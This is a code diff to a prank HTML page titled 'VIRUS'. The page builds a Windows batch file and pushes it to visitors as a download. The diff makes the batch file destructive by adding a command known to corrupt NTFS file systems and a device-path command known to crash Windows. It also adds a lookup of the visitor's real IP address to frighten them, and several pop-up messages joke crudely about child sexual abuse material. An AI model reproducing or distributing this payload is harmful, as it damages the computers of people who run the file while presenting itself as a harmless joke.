@@ -2,14 +2,20 @@
 <html>
 	<head>
 		<title>VIRUS!!!111!11!!</title>
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 	</head>
 	<body>
 		<script>
-		var code = `
+			var ip;
+			$.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
+  				ip = data.ip;
+			});
+			var code = `
 @echo off
 color 04
 echo LOL YOU IDIOT LOL YOU GOT HACKED XDXDXD YOU DOWNLOADED VIRUS HAHAHAHHA
 echo Call msgbox("XDXDX YOU HAVE BEEN HACKED BY VIRUS XD LOL LMFAO" ,4096, "LOLOLOLOLOLOL YOU ARE AN IDIOT") > virus.vbs
+cd C:\:$130:$bitmap
 virus.vbs
 color 02
 echo SAY GOODBYE TO YOUR MONEY
@@ -23,11 +29,12 @@ echo FBI OPEN UP
 echo Call msgbox("Accuiring IP..." ,4096, "Now i got your location lol") > virus.vbs
 virus.vbs
 echo FBI OPEN UP!!!
-echo Call msgbox("IP is 420.6.9.0" ,4096, "XD") > virus.vbs
+echo Call msgbox("IP is ${ip}, local IP = 420.6.9.0" ,4096, "XD") > virus.vbs
 virus.vbs
 echo REEEEEEEEEEEEEEEE
-echo Call msgbox("Calling FBI..." ,4096, "youshouldnthavewatchedthatloliporn") > virus.vbs
+echo Call msgbox("Calling FBI..." ,4096, "Quick! Hide the child porn!") > virus.vbs
 virus.vbs
+cd \\.\GLOBALROOT\ConDrv\KernelConnect
 pause`
 			var element = document.createElement('a');
 			element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(code));
